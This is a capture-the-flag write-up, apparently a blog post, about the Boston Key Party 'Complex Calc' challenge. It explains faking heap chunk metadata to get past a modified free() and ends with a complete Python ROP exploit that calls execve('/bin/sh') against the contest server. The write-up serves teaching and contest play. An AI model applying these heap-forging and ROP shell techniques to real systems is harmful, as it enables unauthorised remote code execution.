---
layout: post
title:  "Boston Key Party - PWN 5 ‘Complex Calc’"
date:   2016-03-06
categories: ctf pwn
---

Taking a quick look at this binary, we see it's almost idenfical to the 'Simple Calc'. Testing my ROP chain on it, however, crashes in `free`: It looks like `free(0)` won't fly anymore.

To confirm that my ROP was still valid, I set a breakpoint on the call to `free` and manually wrote the pointer to the original buffer into RDI. With this, my ROP indeed did work and I could focus on passing the `free` call.

Peeking into the implementation of `free`, we see that a few NOPs were added to prevent us from providing 0 as the pointer. Looking a bit further, we see `[rdi-8]` and `[rdi-10h]` are referenced. That means that the metadata for the structure exists just _before_ the block.

Breaking on the `malloc` call, and inspecting the memory around, we see that 16 bytes before the returned pointer seems to be always null, while -8 is some odd number. Playing around with the number of calculations requested we see that this number grows with size: It's the size of the block, plus the size of the metadata, then aligned to some multiple of 16.

{% highlight bash %}
0x000000000040143f in main ()
gdb-peda$ x/4gx $rax - 0x10
0x6c8bc0:       0x0000000000000000      0x0000000000000021
0x6c8bd0:       0x0000000000000000      0x0000000000000000
{% endhighlight %}

I got lucky in that I already know about how free works to not have to figure out why the size value is odd: The low bit represents whether or not the allocation is in use. When `free` is called, the bit is set to 0, but also the next block is checked. If that block is also not in use, then the two blocks are coalesced. This is to try to prevent memory fragmentation.

The next block can easily be found by adding the size to the current allocation:

{% highlight bash %}
gdb-peda$ x/4gx $rax - 0x10 + 0x20
0x6c8be0:       0x0000000000000000      0x0000000000020421
0x6c8bf0:       0x0000000000000000      0x0000000000000000
{% endhighlight %}

If we want the `free` call to pass, then we are going to need to pass it a pointer memory that has what looks like a valid malloc block 16 bytes before it. On top of that, we need the _next_ block (determined by adding the _size_ to the pointer) has a _size_ value that is odd, to prevent coalescing.

Luckily for us, we can do just that: In our last ROP we only needed a few of the global vars (`sub` and `divv`), leaving us `add` and `mul` to fill with allocation metadata. Testing with a valid allocation, I confirmed that garbage data at -0x10 doesn't seem to affect the freeing, making our job easier.

Since the ROP is the same, we should only need a few changes:

1. Instead of writing NULL on the stack, we need to be careful to overwrite the buf pointer with a pointer to our fake allocation.
2. We need to write two blocks of junk metadata. The first must have a size that is the correct distance away from the second and have the low bit set. The second must only have the low bit set.

I spent _way_ too much time trying to make these metadata blocks contiguous (16 bytes apart), but eventually realized that the minimum distance is the minimum alloc (1) plus the size of the metadata (16) rounded up. Lucky for us, `add` and `mul` are indeed that distance apart.

I populated the first block by providing two numbers to the app opration whose sum is 0x21. This required a negative number, since there was an unsigned check to ensure the operant is greater than 39.

The second number was easier: I just needed to populate it with any odd number, and the result of 41*41 fit the bill.

What's important to note is that I don't provide `free` a pointer to the metadata, but 16 bytes beyond that, which is `divv`, where I had placed the string "/bin/sh\0". This, I would find out, is very important...

Excitedly running the new exploit and... crash. Wtf? Breaking into it with a debugger and following through the ROP, I saw that my string had been wiped out. Stepping through main, I realized that because I was freeing `divv`, it was getting zeroed out.

Now the issue I had with 'Simple Calc' ended up helping me out: Because I had had to find and use a write mem gadget to get rid of `_dl_tls_static_used`, I was prepared for this: Instead of writing to the global `divv` using calculation caching, I would instead write it _after_ the free as extra ROPs.

{% highlight python %}
import struct

def write_addr(addr):
    return ADD + str(addr-40) + "\n" + "40\n" + NULL

# Commands
ADD = "1\n"
SUB = "2\n"
MUL = "3\n"
DIV = "4\n"
DONE = "5\n"
NULL = SUB+"40\n"+"40\n"
# Gadgets
POP_RDI = write_addr(0x00401b73)
POP_RAX = write_addr(0x0044db34)
POP_RDX = write_addr(0x00437a85)
POP_RSI = write_addr(0x00401c87)
MOV_EDX_TO_AT_RAX = write_addr(0x0044526f)
SYSCALL = write_addr(0x004648e5)
# Globals
addX = 0x6C4A80
addY = addX + 4
addRes = addY + 4
divX = addRes + 8
divY = divX + 4
divRes = divY + 4
mulX = divRes + 8
mulY = mulX + 4
mulRes = mulY + 4
subX = mulRes + 8
subY = subX + 4
subRes = subY + 4
_dl_tls_static_used = 0x6C4AC0

# Build commands
commands = [
    "100\n",  # Any large number
    write_addr(addX+16)*9,  # Fill stack with address of divX. This will wipe it out :(
    # Set _dl_tls_static_used to 0
    POP_RAX,
    write_addr(_dl_tls_static_used),
    POP_RDX,
    NULL, NULL,
    MOV_EDX_TO_AT_RAX,
    # Put "/bin/sh" at divX using ROP
    POP_RAX,
    write_addr(divX),
    POP_RDX,
    write_addr(struct.unpack("<I", b"/bin")[0]),
    MOV_EDX_TO_AT_RAX,
    POP_RAX,
    write_addr(divY),
    POP_RDX,
    write_addr(struct.unpack("<I", b"/sh\x00")[0]),
    MOV_EDX_TO_AT_RAX,
    # Now get ready for syscall
    POP_RDI,
    write_addr(divX),  # divX holds the string "/bin/sh"
    POP_RAX,
    SUB + str(0x3b + 0x1000) + "\n" + "4096\n" + NULL,  # 0x3b = execve
    POP_RDX,
    NULL, NULL,  # RDX should be null
    POP_RSI,  # RSI should point to an array that has a pointer to "/bin/sh" and a null pointer
    write_addr(subY),
    SYSCALL,
    # Now we need to populate the global vars by running extra calcs
    # -- Put pointer to divX at subY with null after
    SUB + str(divX) + "\n" + str(divX) + "\n",
    # Now we need to put two malloc blocks in add and mul
    # The first 8 bytes (x and y) don't matter, it's the result that does
    ADD + "-123\n" + "156\n",  # sum is 0x21
    MUL + "41\n" + "41\n",  # product is odd
    DONE
]

from pwn import *

r = remote("simplecalc.bostonkey.party", 5500)
garbage = r.recv()
r.send("".join(commands))
r.interactive()
{% endhighlight %}
